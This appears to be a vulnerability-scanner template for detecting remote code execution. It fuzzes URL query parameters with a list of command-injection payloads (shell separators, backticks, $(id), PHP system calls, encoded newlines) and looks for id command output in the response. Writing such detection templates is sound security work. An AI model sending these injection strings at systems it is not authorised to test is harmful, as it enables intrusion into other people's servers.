id: RCE
info:
  author: 25
  name: Remote Code Execution (RCE) Detection
  severity: high
  tags: rce
requests:
- fuzzing:
  - fuzz:
    - '{{injection}}'
    mode: single
    part: query
    type: replace
  matchers:
  - part: body
    regex:
    - uid=[0-9a-zA-Z_()-. ]+gid=[0-9a-zA-Z_()-. ]+
    type: regex
  matchers-condition: or
  method: GET
  path:
  - '{{BaseURL}}'
  payloads:
    injection:
    - '| id'
    - ; id
    - '&& id'
    - '|| id'
    - $(id)
    - '`id`'
    - ; system("id")
    - ; system("/usr/bin/id")
    - ;id;
    - '|id|'
    - '|/usr/bin/id|'
    - '||/usr/bin/id|'
    - '%0Aid%0A'
    - '%0A/usr/bin/id%0A'
    - a);id
    - a);/usr/bin/id
    - a|id
    - a|/usr/bin/id
    - a;id
    - a;/usr/bin/id
    - <?php system("id");?>
    - '"%2B`id`%2B"'
    - '".system(%27id%27); $dummy="'
  stop-at-first-match: true
